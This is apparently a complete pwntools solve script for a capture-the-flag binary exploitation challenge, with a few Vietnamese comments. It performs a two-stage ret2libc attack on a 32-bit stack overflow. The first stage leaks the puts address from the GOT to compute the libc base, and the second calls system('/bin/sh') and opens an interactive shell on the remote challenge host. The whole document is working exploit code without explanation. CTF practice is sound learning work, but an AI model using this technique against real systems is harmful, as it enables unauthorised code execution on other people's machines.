#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so.2")

context.binary = exe


p = remote('chall.v1t.site', 30212)
# p = process(exe.path)

offset = 308 + 4

payload1 = flat(
    b'A' * offset,
    p32(exe.plt['puts']),      # Gọi puts
    p32(exe.symbols['main']),  # Quay lại main để stage 2
    p32(exe.got['puts'])       # Tham số: puts@got
)

p.sendline(payload1)

p.recvuntil(b'here!\n')
leak = u32(p.recv(4))
libc_base = leak - libc.symbols['puts']
log.info(f"Libc base: {hex(libc_base)}")

payload2 = flat(
    b'A' * offset,
    p32(libc_base + libc.symbols['system']),
    p32(exe.symbols['main']),
    p32(libc_base + next(libc.search(b'/bin/sh')))
)

p.sendline(payload2)


p.interactive()